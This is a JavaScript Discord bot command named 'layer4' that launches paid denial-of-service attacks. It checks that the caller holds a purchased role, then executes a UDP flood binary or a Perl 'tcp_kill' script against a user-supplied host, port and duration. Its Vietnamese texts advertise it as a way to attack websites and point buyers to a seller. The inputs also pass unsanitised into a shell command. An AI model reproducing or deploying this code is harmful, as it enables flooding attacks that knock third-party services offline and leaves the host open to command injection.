const { MessageEmbed } = require("discord.js")
const ayarlar = require('../../ayarlar.json');
var version = ayarlar.versionbot;
var roleID = ayarlar.roleID;
var img = ayarlar.img;

module.exports = {
    name: 'layer4',
    description: 'TẤN CÔNG CÁC TRANG WEB VỚI LAYER4',
    type: 'CHAT_INPUT',
    cooldown:  60,
    options: [
      {
    name: "methods",
      description: "Enter your methods",
       type: "STRING",
       required : true,
      choices: [{
            name: `${'TCP-KILL'}`,
            value: `${'TCP-KILL'}`,
            inline: true
        },{
        name: `${'UDP-GOD'}`,
            value: `${'UDP-GOD'}`,
            inline: true
        }
        ],
      }, 
{
  name: "host",
  description:"ENTER IP WEBSITE TO SENT ATTACK",
  required: true,  
  type: "STRING"
},
      {
  name: "port",
  description:"ENTER PORT WEBSITE TO SENT ATTACK",
  required: true,  
  type: "STRING"
      },
      {
        name: "duration",
  description:"ENTER TIME TO SENT ATTACK",
  required: true,  
  type: "STRING"
      }],
  run: async (client, interaction) => {

    if (!interaction.member.roles.cache.has(roleID))
      return interaction.reply({
        embeds: [
          new MessageEmbed()
            .setColor("RANDOM")
            .setDescription(`Chỉ có <@&${roleID}> mới được dùng lệnh này \n Liên Hệ VIOLATION#1111 Để Mua Nhé !`)
            .setFooter({ text: "© Developer: VIOLATION#1111" })
            .setTimestamp(),
        ],
      });  
const methods = interaction.options.getString("methods")
      const host = interaction.options.getString("host")
const port =
 interaction.options.getString("port")
const duration= 
interaction.options.getString("duration")


       if (methods === 'UDP-GOD') {
var value = 'UDP-GOD';
    var exec = require('child_process').exec
      exec(`sudo ./udp ${host} ${port} 100 40000 ${duration}`, (error, stdout, stderr) => {
    });
    console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
      const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
    .setImage("https://media.discordapp.net/attachments/953949680344125441/1065608797722255400/685986758e01fdfbc49cfe882397ef0c.gif")
        .addFields(
          {
name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
          {
            name: "`⚡ Methods:`",
            value: `\`\`\`css\n [ ${methods}] \n\`\`\``,
            inline: true,      
          },
        {
          name: "`🎃 HOST:`",
          value: `\`\`\`css\n [ ${host} ] \n\`\`\``,
          inline: true,
        },
{
          name: "`💀 PORT:`",
          value: `\`\`\`css\n [ ${port} ] \n\`\`\``,
          inline: true,
        },

          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${duration} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`🔰 Mode`",
            value:  `\`\`\`css\n [ Layer4 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ VIP ] \n\`\`\``,
                inline: true
})
        .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed]  })
                }, 3000)
            })
       }
               

          
          
       if (methods === 'TCP-KILL') {
var value = 'TCP-KILL';
    var exec = require('child_process').exec
      exec(`perl tcp_kill.pl ${host} ${port} 80000 ${duration}`, (error, stdout, stderr) => {
    });
    console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
      const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
    .setImage("https://media.discordapp.net/attachments/953949680344125441/1065608797722255400/685986758e01fdfbc49cfe882397ef0c.gif")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
          {
            name: "`⚡ Methods:`",
            value: `\`\`\`css\n [ ${methods}] \n\`\`\``,
            inline: true,      
          },
        {
          name: "`🎃 HOST:`",
          value: `\`\`\`css\n [ ${host} ] \n\`\`\``,
          inline: true,
        },
{
          name: "`💀 PORT:`",
          value: `\`\`\`css\n [ ${port} ] \n\`\`\``,
          inline: true,
        },

          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${duration} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`🔰 Mode`",
            value:  `\`\`\`css\n [ Layer4 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ VIP ] \n\`\`\``,
                inline: true
})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed]  });
               
              })

              }, 3000)
  }  
}
}

    